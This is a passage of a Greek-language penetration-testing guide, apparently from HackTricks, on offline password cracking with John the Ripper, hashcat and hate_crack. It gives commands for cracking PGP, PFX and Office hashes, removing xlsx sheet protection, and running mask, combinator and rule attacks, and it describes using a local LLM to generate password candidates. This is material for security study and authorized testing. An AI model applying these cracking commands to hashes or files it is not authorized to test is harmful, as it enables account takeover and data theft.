dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```

### Ιδιωτικό κλειδί PGP/GPG

```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```

### Cisco

<figure><img src="../images/image (663).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Χρησιμοποιήστε το [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και έπειτα το john

### Στήλη του Open Office προστατευμένη με κωδικό πρόσβασης

Αν έχετε ένα αρχείο xlsx με στήλη προστατευμένη με κωδικό πρόσβασης, μπορείτε να την αποπροστατεύσετε:

- **Ανεβάστε το στο Google Drive** και ο κωδικός πρόσβασης θα αφαιρεθεί αυτόματα
- Για να τον **αφαιρέσετε** **χειροκίνητα**:

```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```

### Πιστοποιητικά PFX

```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Εργαλεία

**Παραδείγματα hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Λίστες λέξεων

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Εργαλεία δημιουργίας λιστών λέξεων**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Προηγμένο εργαλείο δημιουργίας keyboard-walk με παραμετροποιήσιμους βασικούς χαρακτήρες, keymap και διαδρομές.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### Μεταλλάξεις John

Διαβάστε το _**/etc/john/john.conf**_ και ρυθμίστε το.

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Επιθέσεις Hashcat

- **Wordlist attack** (`-a 0`) με rules

Το **Hashcat** περιλαμβάνει ήδη έναν **φάκελο με rules**, αλλά μπορείτε να βρείτε [**άλλα ενδιαφέροντα rules εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Εξηγήστε και αναλύστε αρχεία κανόνων

Οι κανόνες του Hashcat εκτελούν opcodes από αριστερά προς τα δεξιά. Αυτό είναι εύκολο να παρερμηνευτεί όταν οι λειτουργίες εφαρμόζονται στη θέση μηδέν: το `^e ^h ^t` προσθέτει πρώτα το `e`, μετά το `h` και έπειτα το `t` στην αρχή, μετατρέποντας έτσι το `password` σε `thepassword`. Οι αντικαταστάσεις είναι συγκρίσεις byte με διάκριση πεζών-κεφαλαίων, επομένως ένας κανόνας όπως το `sa@` δεν κάνει τίποτα σε ένα κεφαλαίο `A`. Δοκιμάστε άγνωστους κανόνες σε αντιπροσωπευτικά basewords με πεζούς, κεφαλαίους και συνδυασμούς πεζών-κεφαλαίων χαρακτήρες πριν αφιερώσετε χρόνο GPU σε αυτούς.<sup>[[6]](#references)[[9]](#references)</sup>

Το [HashcatRosetta](https://github.com/bandrel/HashcatRosetta) μπορεί να εμφανίσει κάθε ενδιάμεσο υποψήφιο και να συνοψίσει την κατανομή των opcodes ενός ολόκληρου αρχείου κανόνων. Οι στατικές μετρήσεις opcodes δείχνουν αν ένα αρχείο κυρίως προσθέτει χαρακτήρες στο τέλος ή στην αρχή, αντικαθιστά ή περικόπτει χαρακτήρες. Δεν αποδεικνύουν ότι ένας κανόνας θα σπάσει έναν κωδικό πρόσβασης, αλλά βοηθούν στην επιλογή ενός συνόλου κανόνων που ταιριάζει με τα παρατηρούμενα μοτίβα κωδικών πρόσβασης του πληθυσμού-στόχου.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Μείωση πλεοναζόντων rules με debug logs

Η debug mode του Hashcat καταγράφει τους μετασχηματισμούς των rules ξεχωριστά από την κανονική έξοδο κατάστασης και αποτελεσμάτων. Η mode `4` γράφει `baseword:rule:candidate`, ενώ η mode `5` προσθέτει το source wordlist. Ορίζετε πάντα ρητά το `--debug-file`. Διαφορετικά, το Hashcat ανοίγει το `hashcat.debugfile` στον φάκελο προφίλ του, και η ανακατεύθυνση του stdout καταγράφει τη ροή της κονσόλας αντί για αυτές τις εγγραφές. Τα debug files ανοίγουν σε λειτουργία προσθήκης, επομένως αφαιρέστε ή περιστρέψτε ένα παλιό αρχείο πριν από μια νέα μέτρηση και προστατέψτε το, καθώς περιέχει basewords και candidates σε plaintext.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Χρησιμοποιήστε το `frequency` για να εντοπίσετε τους κανόνες που εφαρμόζονται συχνότερα, το `basewords` για να μετρήσετε την κάλυψη διακριτών εισόδων και το `candidates` για να μετρήσετε τις διακριτές εξόδους. Η κατάταξη των candidates είναι συνήθως το καλύτερο σημείο εκκίνησης για περιορισμό, καθώς ένας κανόνας που εφαρμόζεται συχνά μπορεί παρ' όλα αυτά να αντιστοιχίζει πολλές εισόδους σε διπλότυπα candidates. Αντιγράψτε τους κανόνες με τη μεγαλύτερη αξία σε ένα μικρότερο αρχείο, εκτελέστε τον ξανά στα υπόλοιπα hashes και συγκρίνετε τις αναφορές μεταξύ των εκτελέσεων. Το Mode `5` δείχνει επίσης αν κάθε αρχικό wordlist συνεισφέρει χρήσιμα basewords· επιβάλετε το parsing με `--debug-mode 4` ή `--debug-mode 5` όταν οι άνω και κάτω τελείες στα δεδομένα καθιστούν αμφίσημη την αυτόματη ανίχνευση.<sup>[[6]](#references)[[9]](#references)</sup>

- Επίθεση **Wordlist combinator**

Είναι δυνατό να **συνδυάσετε 2 wordlists σε 1** με το hashcat.\
Αν η λίστα 1 περιείχε τη λέξη **"hello"** και η δεύτερη περιείχε 2 γραμμές με τις λέξεις **"world"** και **"earth"**, θα δημιουργούνταν οι λέξεις `helloworld` και `helloearth`.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Grammar-driven combinator attacks (παράδειγμα κρυπτογραφημένου Office)

Ένας κωδικός πρόσβασης μπορεί να είναι μεγάλος και να περιέχει πολλές κατηγορίες χαρακτήρων, αλλά να έχει μικρό **effective search space** όταν ακολουθεί μια γνωστή γραμματική. Για ένα κρυπτογραφημένο έγγραφο Office που αποκτήθηκε στο πλαίσιο εξουσιοδοτημένης αξιολόγησης, το `office2john.py` εξάγει την εγγραφή επαλήθευσης κωδικού πρόσβασης· έτσι είναι δυνατές οι τοπικές δοκιμές κωδικών χωρίς online κλειδώματα, περιορισμό ρυθμού ή MFA. Δεν παρακάμπτει την κρυπτογράφηση του εγγράφου.<sup>[[2]](#references)[[5]](#references)</sup>

Αφαιρέστε το πεδίο ονόματος αρχείου που προσθέτει το John, ώστε το Hashcat να λάβει μόνο το verifier:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Επιλέξτε το `-m` με βάση το εξαγόμενο πρόθεμα και όχι την επέκταση του αρχείου. Το Hashcat αντιστοιχίζει τα `$office$*2007*`, `$office$*2010*` και `$office$*2013*` στις λειτουργίες `9400`, `9500` και `9600`· οι εγγραφές παλαιού τύπου `$oldoffice$0/$1` και `$oldoffice$3/$4` χρησιμοποιούν αντίστοιχα τις λειτουργίες `9700` και `9800`.<sup>[[3]](#references)</sup>

Αν πληροφορίες από επαναχρησιμοποίηση κωδικών πρόσβασης, πολιτικές, υποδείξεις ή άτομα που γνωρίζουν τον χρήστη αποκαλύπτουν μια γραμματική όπως `<word><number><optional !><word>`, δημιουργήστε ως αριστερό λεξικό το πρόθεμα που μπορεί να απαριθμηθεί ανεξάρτητα. Αυτό το παράδειγμα δοκιμάζει αριθμούς από `0` έως `99`· αντικαταστήστε το εύρος και τους μετασχηματισμούς με στοιχεία από την αξιολόγηση.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Η λειτουργία επίθεσης `1` του Hashcat προσθέτει κάθε γραμμή του δεξιού dictionary σε κάθε γραμμή του αριστερού dictionary, επομένως αρχεία με `L` και `R` γραμμές παράγουν `L × R` υποψήφιους κωδικούς πριν από την εφαρμογή τυχόν rules. Η ακόλουθη εντολή αφορά συγκεκριμένα μια εγγραφή legacy `$oldoffice$3/$4`· αλλάξτε τη λειτουργία για άλλες μορφές Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Αυτό το μοτίβο προεπεξεργασίας μπορεί να εφαρμοστεί και σε άλλες μορφές που επαληθεύονται offline: απαρίθμησε μόνο εύλογες παραλλαγές κεφαλαίων και πεζών, ημερομηνίες, διαχωριστικά, ψηφία ή σημεία στίξης για ένα στοιχείο και, στη συνέχεια, συνδύασέ το με το υπόλοιπο στοιχείο αντί να δοκιμάσεις με brute force ολόκληρο το ονομαστικό μήκος.<sup>[[4]](#references)[[5]](#references)</sup>

- **Mask attack** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Επικυρώστε τα αρχεία `.hcmask` πριν από την εκτέλεση

Μια κακοσχηματισμένη γραμμή μπορεί να χαθεί ανάμεσα σε έγκυρες μάσκες, επομένως επικυρώστε ολόκληρο το αρχείο και τον εκτιμώμενο χώρο κλειδιών πριν ξεκινήσετε την επίθεση. Το HashcatRosetta αναφέρει τη γραμμή που αποτυγχάνει και επιστρέφει μη μηδενική κατάσταση όταν οποιαδήποτε μάσκα δεν είναι έγκυρη, γεγονός που καθιστά τον έλεγχο κατάλληλο για scripts ή CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Μην κανονικοποιείτε αρχεία mask με γενικούς parsers CSV ή κειμένου. Το Hashcat υποστηρίζει custom charsets `?1` έως `?8`, αντιμετωπίζει το `#` ως σχόλιο μόνο όταν είναι το πρώτο byte και αφαιρεί τα escape με backslash σε ένα πέρασμα, πριν ερμηνεύσει τα tokens `?`. Επομένως, τα αρχικά κενά πριν από το `#` αποτελούν δεδομένα mask, ενώ τα escape μπορούν να αλλάξουν το αν μια ακολουθία ερμηνεύεται ως literal ή ως token charset.<sup>[[6]](#references)[[9]](#references)</sup>

- Επίθεση Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`)

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Περάσματα Hashcat προσαρμοσμένα στον στόχο με το hate_crack

Το [hate_crack](https://github.com/trustedsec/hate_crack) συντονίζει τοπικά περάσματα του Hashcat, αφού έχετε ένα αρχείο hash και γνωρίζετε τη λειτουργία Hashcat που πρέπει να χρησιμοποιήσετε. Το ίδιο το Hashcat πρέπει να εγκατασταθεί ξεχωριστά. Κλωνοποιήστε το αποθετήριο μαζί με τα submodules, εκτελέστε το `make` και, στη συνέχεια, ξεκινήστε μια διαδραστική συνεδρία· η λειτουργία `1000` στο παράδειγμα είναι για NTLM, όχι μια καθολική προεπιλογή. Στα υπάρχοντα κλωνοποιημένα αποθετήρια, εκτελέστε `git submodule update --init --recursive` προτού χρησιμοποιήσετε τις επιλογές PCFG και PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Μάθετε μια γραμματική από ανακτημένα plaintext.** Εκτελέστε αρχικά ένα πέρασμα λεξικού/κανόνων και, στη συνέχεια, εκπαιδεύστε το `pcfg_cracker` με plaintext σχετικά με τον στόχο. Ορίστε το `pcfgRuleset` στο `config.json` στο εκπαιδευμένο ruleset και επιλέξτε PCFG (μενού `20`) για να τροφοδοτείτε το Hashcat με πιθανές δομές ή PRINCE-LING (`21`) για να δημιουργήσετε μια λίστα βάσης PRINCE με καθοδήγηση γραμματικής. Περιορίστε τους δύο generators με τα `pcfgMaxCandidates` και `pcfgPrinceLingMaxCandidates`· το hate_crack δεν εκπαιδεύει τη γραμματική για εσάς. Το PCFG μαθαίνει την πιθανότητα δομών όπως λέξη βάσης συν ψηφία και σύμβολα, σε αντίθεση με τη σταθερή γραμματική στο [παράδειγμα combinator](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Mine rules backwards from known passwords.** Το Spoonman (menu `22`) δέχεται ένα corpus plaintext, συμπεριλαμβανομένου του μη κενού αρχείου `.out` της τρέχουσας συνεδρίας, και παράγει basewords με πεζά γράμματα μαζί με Hashcat rules που ανασυνθέτουν τους κωδικούς πρόσβασης που εντοπίστηκαν. Ταξινομεί τα rules με βάση τον αριθμό των κωδικών πρόσβασης του corpus που αναπαράγουν. Ξεκινήστε με το επίπεδο κάλυψης top-50% και επεκταθείτε μόνο αν δικαιολογείται το πρόσθετο keyspace· συνδυάστε τα παραγόμενα basewords με άλλες σχετικές wordlists όταν η κάλυψη περιορίζεται από το stem που λείπει και όχι από τη μετάλλαξη. Το Hashcat δέχεται έως 31 functions ανά rule και το αλφάβητο θέσεων του καλύπτει μόνο τους δείκτες `0`–`35`· το Spoonman χρησιμοποιεί κυριολεκτικό baseword και no-op rule όταν ένας κωδικός πρόσβασης δεν μπορεί να κωδικοποιηθεί. Πολύ μεγάλα corpora μπορεί να φτάσουν το όριο του μετρητή που χρησιμοποιεί bounded memory, επομένως ελέγξτε την αναφερόμενη κάλυψη αντί να υποθέτετε πλήρη ανακατασκευή. Δείτε το [Hashcat rule behavior](#explain-and-profile-rule-files) πριν χρησιμοποιήσετε ανεξάρτητα τα αποτελέσματα.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Επιλέξτε generator με βάση τα διαθέσιμα στοιχεία.** Το OMEN (`13`) εκπαιδεύει ένα μοντέλο μεταβάσεων χαρακτήρων από μια λίστα κωδικών πρόσβασης και απαριθμεί υποψήφιους κωδικούς με σειρά πιθανότητας, έως το όριο `omenMaxCandidates`. Το Markov brute force (`15`) μπορεί, αντί γι' αυτό, να δημιουργήσει πίνακα `.hcstat2` από τα cracks του τρέχοντος `.out` ή από επιλεγμένη λίστα και να δοκιμάσει ένα εύρος αυξανόμενου μήκους. Όταν οι πληροφορίες για τον στόχο είναι κείμενο και όχι κωδικοί πρόσβασης, το N-gram (`16`) τροφοδοτεί ένα corpus, ακόμα και σε μορφή gzip, στο `ngramX.bin`· το προεπιλεγμένο μέγεθος ομάδας είναι τρία. Πρόκειται για εναλλακτικές, όχι για τρία αντίγραφα της ίδιας λίστας υποψήφιων κωδικών.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Επεκτείνετε μόνο μικρά, πιθανά σύνολα.** Το Permutation (`17`) αναδιατάσσει όλους τους χαρακτήρες κάθε λέξης εισόδου, επομένως ακόμη και μία λέξη οκτώ χαρακτήρων παράγει `8!` αναδιατάξεις. Το Combipow (`19`) παράγει συνδυασμούς μη κενών υποσυνόλων από ένα μικρό σύνολο λέξεων passphrase· το `-s` εισάγει κενά και το εργαλείο απορρίπτει πάνω από 63 γραμμές εισόδου. Το Combinator (`6`) μπορεί να συνδέσει πολλές wordlists με διαχωριστικά μέσω του `--sepFill`· η απλή συνένωση δύο λιστών καλύπτεται από το [native Hashcat combinator](#hashcat-attacks) παραπάνω.<sup>[[13]](#references)[[14]](#references)</sup>

**Ορίστε όρια για επιθέσεις με feedback.** Το Fingerprint (`5`) επεκτείνει επαναληπτικά τους κωδικούς πρόσβασης που αποκρυπτογραφήθηκαν πρόσφατα, αυξάνοντας το μήκος των τμημάτων, αντί να επεκτείνει ξανά ολόκληρο το corpus σε κάθε γύρο· το όριο keyspace συνδυασμών παραλείπει ένα υπερβολικά μεγάλο πέρασμα `-a 1`. Το Hybrid (`7`) δοκιμάζει πρώτα φθηνότερες διακοσμήσεις `?s?d` και έπειτα ευρύτερες μάσκες προσθήκης στην αρχή/στο τέλος `?a`, με το `hcatHybridMaxRuntime` να περιορίζει τη διάρκεια εκτέλεσης. Αυτό έχει σημασία, επειδή το κόστος ενός hybrid περάσματος ισούται με το μέγεθος της wordlist επί τον χώρο της μάσκας, οπότε μια ευρεία μάσκα σε μεγάλη λίστα μπορεί να είναι πολύ πιο δαπανηρή από τα αρχικά περάσματα.<sup>[[13]](#references)[[14]](#references)</sup>

**Παράγετε υποψήφιους κωδικούς από ανακτημένους κωδικούς πρόσβασης με ένα τοπικό LLM.** Αφού ένα αρχικό πέρασμα δημιουργήσει ένα μη κενό `<hashfile>.out`, η επίθεση LLM του hate_crack (κύριο μενού `12`, υπομενού **Cracked passwords** `3`) μπορεί να συμπεράνει basewords, έτη, επιθήματα και χρήση κεφαλαίων/πεζών ειδικά για τον στόχο και έπειτα να υποβάλει νέους υποψήφιους κωδικούς στο Hashcat. Μικρά corpora μπορούν να περιλαμβάνουν ανακτημένα plaintexts στο prompt του μοντέλου· μεγαλύτερα corpora συνοψίζονται σε στατιστικά στοιχεία. Έτσι γενικεύονται τα μοτίβα που παρατηρήθηκαν, αντί να επαναλαμβάνονται απλώς τα σταθερά [rules](#explain-and-profile-rule-files) ή οι [masks](#hashcat-attacks) παραπάνω.<sup>[[13]](#references)[[14]](#references)</sup>

Ρυθμίστε στο `.env` του hate_crack ένα ήδη διαθέσιμο τοπικό μοντέλο Ollama· το εργαλείο δεν πραγματοποιεί αυτόματα λήψη του μοντέλου. Το `OLLAMA_NO_CLOUD=true` απορρίπτει μοντέλα με cloud tag και διευθύνσεις endpoint εκτός δικτύου. Η χρήση ενός endpoint σε localhost από μόνη της δεν αρκεί: το Ollama μπορεί να δρομολογήσει απομακρυσμένα ένα μοντέλο `-cloud`, ενώ τα prompts μπορεί να περιέχουν ανακτημένα plaintexts ή στατιστικά στοιχεία του corpus. Αυτή η ρύθμιση εξακολουθεί να επιτρέπει endpoints σε ιδιωτικά δίκτυα και δεν μπορεί να αποκλείσει έναν proxy μεταφοράς, επομένως επαληθεύστε τη διαδρομή εκτέλεσης του inference πριν στείλετε δεδομένα πελατών.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Συγκρίνετε την απόδοση των υποψηφίων με φθηνότερα περάσματα κανόνων, μασκών και εκπαίδευσης στοχευμένου μοντέλου πριν διαθέσετε μεγαλύτερο budget. Το μοντέλο δημιουργεί υποθέσεις· το Hashcat εξακολουθεί να τις ελέγχει έναντι των hashes.<sup>[[13]](#references)[[14]](#references)</sup>

#### Λειτουργίες Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking Linux Hashes - αρχείο /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking Windows Hashes

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Παραβίαση συνηθισμένων hash εφαρμογών

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [Μέσα στο GoBruteforcer: προεπιλεγμένες ρυθμίσεις διακομιστή που δημιουργήθηκαν με AI, αδύναμοι κωδικοί πρόσβασης και καμπάνιες με επίκεντρο τα crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Παραδείγματα hash του Hashcat και modes για το Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Επίθεση combinator του Hashcat](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Σχεδιασμός κληρονομιάς διαπιστευτηρίων](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Repository HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Υλοποίηση του αρχείου debug του Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Βοήθεια γραμμής εντολών του Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: Διαβάζοντας τη Στήλη της Ροζέτας του password cracking](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Repository και χρήση του PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Repository και οδηγός χρήσης του OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Αρχικό issue του Spoonman και σχεδιασμός εξαγωγής κανόνων](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Repository και τεκμηρίωση επιθέσεων του hate_crack](https://github.com/trustedsec/hate_crack)
- [14] [Τι νέο υπάρχει στο hate_crack από την έκδοση 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Πολιτική προορισμού LLM του hate_crack](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
